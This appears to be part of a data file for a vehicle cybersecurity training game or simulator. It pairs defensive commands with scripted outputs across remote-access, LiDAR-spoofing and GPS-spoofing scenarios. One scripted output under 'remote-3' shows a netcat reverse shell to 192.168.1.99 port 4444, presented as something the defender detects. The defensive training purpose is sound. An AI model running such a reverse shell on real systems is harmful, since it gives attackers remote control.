  id: "remote-3", 
    command: "ps aux | grep nc",
    expectedOutput: "/bin/nc -e /bin/sh 192.168.1.99 4444",
    attackSlug: "remote"
},
{

  id: "remote-4", 
    command: "ip link set can0 down",
    expectedOutput: "[✔] CAN interface can0 disabled",
    attackSlug: "remote"
},
{

  id: "remote-5", 
    command: "firewall --block-ports 8080 5555 6667",
    expectedOutput: "Command executed successfully",
    attackSlug: "remote"
},
{

  id: "remote-6", 
    command: "api-sec --require-auth infotainment",
    expectedOutput: "Command executed successfully",
    attackSlug: "remote"
},
{

  id: "remote-7", 
    command: "netlog --blacklist 192.168.1.99",
    expectedOutput: "Command executed successfully",
    attackSlug: "remote"
},
{

  id: "remote-8", 
    command: "system-status",
    expectedOutput: `[STATUS] CAN Interface: OFF
    [STATUS] Remote Access Ports: Secured
    [STATUS] No unauthorized process detected`,
    attackSlug: "remote"
},

{

  id: "lidar-1", 
    command: "lidar-mon --live",
    expectedOutput: `[ALERT] Repeated fake obstacle @ 2.5m
    [ALERT] LiDAR blackout detected: 0 points returned`,
    attackSlug: "lidar"
},
{

  id: "lidar-2", 
    command: "netstat -anu | grep 2368",
    expectedOutput: "udp  0  0 0.0.0.0:2368  0.0.0.0:*  ←  Unfiltered LiDAR stream port",
    attackSlug: "lidar"
},
{

  id: "lidar-3", 
    command: "tcpdump -i eth0 port 2368 -c 5",
    expectedOutput: "16:01:21 IP 192.168.1.44 > 192.168.1.10.2368",
    attackSlug: "lidar"
},
{

  id: "lidar-4", 
    command: "ufw deny from 192.168.1.44 to any port 2368",
    expectedOutput: "Command executed successfully",
    attackSlug: "lidar"
},
{

  id: "lidar-5", 
    command: "ufw allow from 192.168.1.100 to any port 2368",
    expectedOutput: "Command executed successfully",
    attackSlug: "lidar"
},
{

  id: "lidar-6", 
    command: "ufw deny to any port 2368",
    expectedOutput: "Command executed successfully",
    attackSlug: "lidar"
},
{

  id: "lidar-7", 
    command: "lidar-sec --trusted-ip 192.168.1.100",
    expectedOutput: "Command executed successfully",
    attackSlug: "lidar"
},
{

  id: "lidar-8", 
    command: "systemctl restart lidar-stream",
    expectedOutput: "Command executed successfully",
    attackSlug: "lidar"
},
{

  id: "lidar-9", 
    command: "lidar-status",
    expectedOutput: `[STATUS] LiDAR: Normal
    [STATUS] Packet source: 192.168.1.100 (verified)
    [STATUS] Port 2368: Secured`,
    attackSlug: "lidar"
},
{

  id: "gps-1", 
    command: "gpsmon --live",
    expectedOutput: "[ALERT] Sudden GPS jump: 900+ km shift detected",
    attackSlug: "gps"
},
{

  id: "gps-2", 
    command: "netstat -tuln | grep LISTEN",
    expectedOutput: "tcp  0  0 0.0.0.0:5555  0.0.0.0:*  LISTEN",
    attackSlug: "gps"
},
{

  id: "gps-3", 
    command: "gpslog --last 10",
    expectedOutput: "[15:22:04] Coordinates injected: 41.9028, 12.4964",
    attackSlug: "gps"
},
{

  id: "gps-4", 
    command: "ufw deny from 192.168.1.72 to any port 5555",
    expectedOutput: "[✔] IP blocked",
    attackSlug: "gps"
},
{

  id: "gps-5", 
    command: "gps-sec --restrict --ip 127.0.0.1",
    expectedOutput: "[✔] API restricted to localhost",
    attackSlug: "gps"
},
{

  id: "gps-6", 
    command: "gps-sec --auth enable --token xyz123",
    expectedOutput: "[✔] Auth token required for GPS updates",
    attackSlug: "gps"
},
{

  id: "gps-7", 
    command: "gps-reset --to-last-good",
    expectedOutput: "Command executed successfully",
    attackSlug: "gps"
},
{

  id: "gps-8", 
    command: "systemctl restart nav-stack",
    expectedOutput: "[✔] Navigation restarted",
    attackSlug: "gps"
},
{

  id: "gps-9", 
    command: "gps-status",
    expectedOutput: `[STATUS] GPS: Verified  
    [STATUS] Source IP: 127.0.0.1 (trusted)  
    [STATUS] Port 5555: Secured`,
    attackSlug: "gps"
},
]